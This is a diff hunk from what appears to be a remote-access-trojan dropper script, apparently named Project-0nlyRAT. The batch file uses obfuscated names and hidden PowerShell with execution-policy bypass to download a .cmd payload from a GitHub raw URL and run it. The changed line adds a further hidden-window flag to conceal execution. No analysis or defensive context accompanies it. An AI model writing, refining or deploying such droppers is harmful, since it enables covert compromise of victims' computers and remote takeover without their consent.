@@ -16,7 +16,7 @@ echo %JKgSYUywNCvkasmW%>oSyEZsgTWIU.txt
 powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/1.cmd' -outfile '.\wLMZNyTDPjiugBO.cmd'"
 
 @rem run the payload
-powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wLMZNyTDPjiugBO.cmd"
+powershell -noprofile -w hidden start-process powershell.exe -windowstyle hidden ".\wLMZNyTDPjiugBO.cmd"
 
 @rem move back to saved directory
 cd %CLXduxKZAneOtWBob%
